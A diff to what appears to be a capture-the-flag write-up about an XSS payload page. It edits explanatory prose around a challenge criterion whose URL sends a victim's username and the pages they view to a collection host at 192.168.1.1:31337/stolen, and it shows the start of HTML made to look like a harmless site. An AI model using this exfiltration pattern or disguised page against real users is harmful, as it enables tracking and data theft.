@@ -598,10 +598,10 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >>> **\- "Report each page that is displayed (what the user thinks they are seeing) by loading the url:"**    
 >>>> \- `http://192.168.1.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>`     
 > 
-> **For the sake of space, I won't break out all of the `xss_payload.html` file here**    
+> **For the sake of space, I won't break out all of `xss_payload.html` here.**    
 > **Comments throughout source should associate the purpose of functions with the criteria listed above.**    
-> **Below is snip of the HTML `<style>` to generate a reasonably benign looking site;**    
-> **And, a snip of the functions which generate the payload as links in each of the icons in the screen shot further down.**     
+>
+> **Below is snip of the HTML `<style>` to generate a reasonably benign looking site; and, a snip of the functions which generate the payloads as links in each of the icons found in the screen shot after the code.**     
 >> ```html
 >> <meta charset="utf-8">
 >> <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
